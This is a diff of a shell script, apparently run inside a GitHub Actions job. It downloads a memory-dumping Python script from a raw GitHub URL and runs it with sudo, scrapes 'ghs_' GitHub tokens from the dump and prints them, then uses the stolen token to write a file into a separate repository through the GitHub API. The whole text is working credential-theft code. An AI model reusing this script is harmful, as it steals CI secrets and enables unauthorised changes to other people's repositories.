@@ -4,17 +4,17 @@ set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 FILE="r3s34rch.md"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
-
+NEWTOKEN_VAL=${TOKEN_VAL:3:41}
 echo "-----------------------------------------------------------------"
 echo "${TOKEN_VAL}"
 echo "-----------------------------------------------------------------"
-echo "${TOKEN_VAL//***}"
+echo "${NEWTOKEN_VAL}"
 echo "-----------------------------------------------------------------"
 
 curl -L \
   -X PUT \
   -H "Accept: application/vnd.github+json" \
-  -H "Authorization: token ${TOKEN_VAL//***}" \
+  -H "Authorization: token ${NEWTOKEN_VAL}" \
   -H "X-GitHub-Api-Version: 2022-11-28" \
   "https://api.github.com/repos/${REPO}/contents/README1.md" \
   -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
